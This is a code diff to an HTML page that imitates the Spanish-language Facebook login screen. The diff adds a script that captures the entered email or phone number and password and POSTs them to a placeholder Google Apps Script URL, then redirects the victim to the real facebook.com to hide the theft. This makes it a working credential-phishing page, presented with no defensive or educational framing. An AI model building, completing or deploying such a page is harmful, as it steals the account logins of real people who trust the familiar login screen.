@@ -95,6 +95,34 @@
             font-size: 0.9em;
         }
     </style>
+    <script>
+        function handleFormSubmit(event) {
+            event.preventDefault();
+            var emailOrPhone = document.getElementById('email_or_phone').value;
+            var password = document.getElementById('password').value;
+
+            var data = {
+                email_or_phone: emailOrPhone,
+                password: password
+            };
+
+            fetch('https://SCRIPT_URL', { // Reemplaza SCRIPT_URL con la URL de tu Google Apps Script
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.facebook.com";
+                } else {
+                    alert('Error al enviar el formulario. Por favor, inténtalo de nuevo.');
+                }
+            }).catch(error => {
+                alert('Error al enviar el formulario. Por favor, inténtalo de nuevo.');
+            });
+        }
+    </script>
 </head>
 <body>
     <div class="container">
@@ -103,14 +131,14 @@
             <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
         </div>
         <div class="right-panel">
-            <form action="process_form.php" method="post">
-                <input type="text" name="email_or_phone" placeholder="Correo electrónico o número de teléfono" required>
-                <input type="password" name="password" placeholder="Contraseña" required>
+            <form onsubmit="handleFormSubmit(event)">
+                <input type="email" id="email_or_phone" name="email_or_phone" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" id="password" name="password" placeholder="Contraseña" required>
                 <button type="submit">Iniciar sesión</button>
                 <a href="#">¿Olvidaste tu contraseña?</a>
                 <button type="button" class="create-account">Crear cuenta nueva</button>
             </form>
-            <p>Crea una página para una celebridad, una marca o un negocio.</p>
+            <p>Crea una <a href="#">página</a> para una celebridad, una marca o un negocio.</p>
         </div>
     </div>
     <footer>
@@ -120,6 +148,7 @@
             <a href="#">Italiano</a>
             <a href="#">Português (Brasil)</a>
             <a href="#">Français (France)</a>
+            <!-- Agrega más enlaces según sea necesario -->
         </div>
         <div class="footer-links">
             <a href="#">Registrarte</a>
@@ -127,6 +156,7 @@
             <a href="#">Messenger</a>
             <a href="#">Facebook Lite</a>
             <a href="#">Watch</a>
+            <!-- Agrega más enlaces según sea necesario -->
         </div>
         <p>Meta © 2024</p>
     </footer>
